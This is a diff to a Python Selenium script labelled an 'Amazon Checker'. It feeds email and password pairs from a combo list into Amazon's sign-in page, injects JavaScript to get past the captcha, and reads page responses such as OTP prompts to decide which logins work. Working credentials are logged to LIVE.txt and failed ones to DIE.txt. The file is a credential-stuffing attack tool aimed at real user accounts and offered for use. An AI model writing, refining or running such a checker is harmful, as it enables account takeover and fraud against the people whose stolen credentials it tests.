@@ -41,33 +41,28 @@ class checker(object):
     def bypassJS(self):
         bypassCaptcha = "document.getElementById('auth-captcha-guess').dispatchEvent(new Event('change'));"
         driver.execute_script(bypassCaptcha)
-
-
-    def bypassPWD(self):
-        bypassPwd = "document.getElementById('ap_password').dispatchEvent(new Event('change'));"
-        driver.execute_script(bypassPwd)
-        
-    def validAcc(self, email, password):
+      
+    def validAcc(self, mail, passw):
         global checked, good, loaded
         good += 1
         checked += 1
         lock.acquire()
         f = open("LIVE.txt", "a+")
-        f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
+        f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}\n".format(mail, passw))
         f.close()
         lock.release()
-        driver.quit()
+        
     
-    def invalidAcc(self, email, password):
+    def invalidAcc(self, mail, passw):
         global checked, bad, loaded
         bad += 1
         checked += 1
         lock.acquire()
         f = open("DIE.txt", "a+")
-        f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
+        f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(mail, passw))
         f.close()
         lock.release()
-        driver.quit()
+        
 
     def checker_main(self, email, password):
         global loaded, good, bad, checked, errors
@@ -99,6 +94,7 @@ class checker(object):
                 sleep(3)
                 if """We cannot find an account with that email address""" in driver.page_source:
                     self.invalidAcc(email, password)
+                    driver.quit()
                 else:
                     sleep(3)
                     input_pass = f"document.getElementById(\"ap_password\").value='{password}'"
@@ -108,6 +104,7 @@ class checker(object):
                     sleep(3)
                     if """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                         self.validAcc(email, password)
+                        driver.quit()
                     elif """To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.""" in driver.page_source:
                         print(Fore.LIGHTGREEN_EX + "Processing....")
                         input_pass = f"document.getElementById(\"ap_password\").value='{password}'"
@@ -126,12 +123,16 @@ class checker(object):
                         sleep(5)
                         if """Your password is incorrect""" in driver.page_source:
                             self.invalidAcc(email, password)
+                            driver.quit()
                         elif """Authentication required""" in driver.page_source:
                             self.validAcc(email, password)
+                            driver.quit()
                         elif """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                             self.validAcc(email, password)
+                            driver.quit()
                         elif """This is required if your sign-in looks different because you’ve cleared your cookies or you're signing from a different browser, device, or location.""" in driver.page_source:
                             self.validAcc(email, password)
+                            driver.quit()
                         elif """Enter the characters as they are given in the challenge.""" in driver.page_source:
                             try:
                                 print(Fore.LIGHTRED_EX + "Processing wrong captcha....")
@@ -158,12 +159,16 @@ class checker(object):
                                     sleep(3)
                                     if """Your password is incorrect""" in driver.page_source:
                                         self.invalidAcc(email, password)
+                                        driver.quit()
                                     elif """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                                         self.validAcc(email, password)
+                                        driver.quit()
                                     elif """Authentication required""" in driver.page_source:
                                         self.validAcc(email, password)
+                                        driver.quit()
                                     else:
                                         self.validAcc(email, password)
+                                        driver.quit()
                                     break
                             except:
                                 continue
@@ -172,6 +177,7 @@ class checker(object):
                         break
                     else:
                         self.invalidAcc(email, password)
+                        driver.quit()
                     break
                 break
             except:
@@ -204,7 +210,6 @@ class checker(object):
             for _ in pool.imap_unordered(self.sender, self.combo_list):
                 pass
         except KeyboardInterrupt:
-            driver.quit()
             _exit(0)
 
         print("Done!")
